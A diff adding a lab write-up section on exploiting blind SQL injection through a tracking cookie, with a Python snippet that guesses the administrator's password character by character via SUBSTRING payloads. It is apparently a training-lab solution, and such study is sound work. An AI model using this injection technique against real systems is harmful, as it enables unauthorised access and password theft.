@@ -50,5 +50,30 @@ The database contains a different table called users, with columns called userna
 
 To solve the lab, log in as the administrator user. 
 
+**SQL Injection Validation**
+In order to confirm if the application is vulnerable or not to blind SQL injection, was sent two different payloads on the `cookies`. The first one with a SQL statement that doesn't return any result, as shown below:
+![First payload](images/image01.png)
+  
+And the second with a `where` clause that always evaluates to true:
+
+![Second payload](images/image02.png)
+  
+**Exploit**
+With this, a [python script](exploit.py) was created to inject a SQL statement that tries to guess the password character by character, position by position:
+
+```python
+# code snippet of the exploit
+for char in string.printable:
+    ...
+    payload = f'{TRACKING_ID}\'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'{USERNAME}\'),{pos},1)=\'{char}'
+
+    cookies = {'TrackingId': payload, 'session': SESSION_ID}
+    response = session.get(url=BASE_URL, cookies=cookies)
+```
+  
+![Exploit execution](images/image03.png)
+  
+![Login as administrator](images/image04.png)
+
 ## Key Words
-> sql injection, blind, cookie
+> sql injection, blind, cookie, python
